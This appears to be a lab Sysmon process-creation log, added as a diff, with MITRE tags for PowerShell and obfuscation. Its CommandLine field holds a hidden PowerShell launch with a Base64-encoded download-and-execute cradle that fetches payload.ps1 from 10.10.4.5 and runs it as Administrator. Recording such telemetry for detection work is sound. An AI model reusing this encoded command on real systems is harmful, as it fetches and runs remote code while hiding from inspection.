@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+   <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-12-01T16:14:32.9457210Z" />
+      <EventRecordID>4956</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4028" ThreadID="5104" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>win11v.condef.local</Computer>
+      <Security UserID="S-1-5-18" />
+   </System>
+   <EventData>
+      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell;technique_id=T1027,technique_name=Obfuscated Files or Information</Data>
+      <Data Name="UtcTime">2024-12-01 16:14:32.941</Data>
+      <Data Name="ProcessGuid">{f3565dc0-8ab8-674c-8601-000000000c00}</Data>
+      <Data Name="ProcessId">8412</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft® Windows® Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">PowerShell.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4ANAAuADUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==</Data>
+      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
+      <Data Name="User">CONDEF\Administrator</Data>
+      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
+      <Data Name="LogonId">0x16ad6e</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=1826D6CD53F4A2ED09B29075BB99381E51D5586C,MD5=04529E7FD1E19A9F077E33116FBE1DE4,SHA256=6412920B4A4D50E1C87411D5AA1BC0A506AE6A80F3F04A28FEAF1FB19FFCB604,IMPHASH=A462A063980CA0D65EBB09A8AD4E4787</Data>
+      <Data Name="ParentProcessGuid">{f3565dc0-8a4f-674c-8501-000000000c00}</Data>
+      <Data Name="ParentProcessId">7784</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass</Data>
+      <Data Name="ParentUser">CONDEF\Administrator</Data>
+   </EventData>
+</Event>
